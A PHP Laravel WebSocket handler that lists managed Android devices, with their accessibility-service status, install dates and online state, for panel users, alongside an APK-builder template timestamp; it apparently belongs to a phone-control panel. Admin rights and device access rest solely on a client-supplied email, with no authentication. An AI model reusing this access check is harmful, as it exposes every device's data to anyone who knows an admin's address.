<?php

declare(strict_types=1);

namespace App\WebSocket\Handlers;

use App\Models\Device;
use App\WebSocket\ConnectionManager;
use Illuminate\Support\Facades\Log;

final class CheckPhoneHandler
{
    private ConnectionManager $connectionManager;

    public function __construct(ConnectionManager $connectionManager)
    {
        $this->connectionManager = $connectionManager;
    }

    public function handle(int $fd, array $data): void
    {
        $email = $data['email'] ?? '';
        $page = max(1, (int) ($data['page'] ?? 1));
        $pageSize = min(100, max(1, (int) ($data['pageSize'] ?? 10)));
        $filters = $data['filters'] ?? [];

        \Illuminate\Support\Facades\DB::reconnect();

        // 根据 admins 表判断是否为总管理员
        $isAdmin = \App\Models\Admin::where('email', $email)->exists();

        Log::channel('websocket')->debug("CheckPhone: fd={$fd}, email={$email}, isAdmin=" . ($isAdmin ? 'true' : 'false'));

        // 注册面板用户
        $this->connectionManager->registerPanelUser($fd, $email, $isAdmin);

        $query = Device::query()->where('is_removed', false);

        if (!$isAdmin) {
            // 使用明文 email 查询用户关联的设备
            $query->whereHas('user', function ($q) use ($email) {
                $q->where('email', $email);
            });
        }

        $this->applyFilters($query, $filters);

        $total = $query->count();
        Log::channel('websocket')->debug("CheckPhone: found {$total} devices for email={$email}");
        $pageCount = (int) ceil($total / $pageSize);

        $devices = $query
            ->orderByDesc('last_seen_at')
            ->offset(($page - 1) * $pageSize)
            ->limit($pageSize)
            ->get();

        // 获取内存中所有在线设备的状态，用于实时判断在线状态
        $onlineDevices = $this->connectionManager->getAllOnlineDevices();

        $list = $devices->map(function (Device $device) use ($onlineDevices) {
            $uuid = $device->uuid;
            $status = $this->connectionManager->getDeviceStatus($uuid);

            // 优先使用内存中的在线状态（更准确）
            $isOnline = isset($onlineDevices[$uuid]);

            // 如果内存中有更新的设备信息，使用内存中的数据
            $memoryStatus = $onlineDevices[$uuid] ?? [];

            return [
                'phone_id' => $uuid,
                'phone_name' => $memoryStatus['name'] ?? $device->name ?? '',
                'model' => $memoryStatus['model'] ?? $device->model ?? '',
                'android_version' => $memoryStatus['android_version'] ?? $device->android_version ?? '',
                'battery_charge' => $memoryStatus['battery_level'] ?? $device->battery_level ?? '',
                'accessibility' => ($memoryStatus['has_accessibility'] ?? ($device->has_accessibility ? '1' : '0')) === '1' ? '1' : ($device->has_accessibility ? '1' : '0'),
                'country' => $memoryStatus['country'] ?? $device->country ?? '',
                'user_email' => $status['user_email'] ?? '',
                'install_date' => $device->installed_at?->format('Y-m-d H:i:s') ?? '',
                'is_online' => $isOnline,
                'lastPing' => ($status['last_ping'] ?? 0) * 1000,
            ];
        })->toArray();

        $this->connectionManager->send($fd, [
            'type' => 'checkphone',
            'list' => $list,
            'total' => $total,
            'pageCount' => $pageCount,
            'page' => $page,
            'pageSize' => $pageSize,
            'fileLastModified' => $this->getApkTemplateLastModified(),
        ]);
    }

    private function applyFilters($query, array $filters): void
    {
        if (!empty($filters['user_email'])) {
            $query->whereHas('user', function ($q) use ($filters) {
                $q->where('email', 'like', '%' . $filters['user_email'] . '%');
            });
        }

        if (!empty($filters['phone_name'])) {
            $query->where('name', 'like', '%' . $filters['phone_name'] . '%');
        }

        if (!empty($filters['country'])) {
            $query->where('country', $filters['country']);
        }

        if (!empty($filters['model'])) {
            $query->where('model', 'like', '%' . $filters['model'] . '%');
        }

        if (isset($filters['accessibility']) && $filters['accessibility'] !== '') {
            $query->where('has_accessibility', $filters['accessibility'] === '1');
        }

        if (!empty($filters['install_date'])) {
            $query->whereDate('installed_at', $filters['install_date']);
        }
    }

    private function getApkTemplateLastModified(): string
    {
        $templatePath = config('apk-builder.template_path', '');

        if (empty($templatePath) || !is_dir($templatePath)) {
            return '';
        }

        $mtime = filemtime($templatePath);

        return $mtime !== false ? date('Y-m-d H:i:s', $mtime) : '';
    }
}
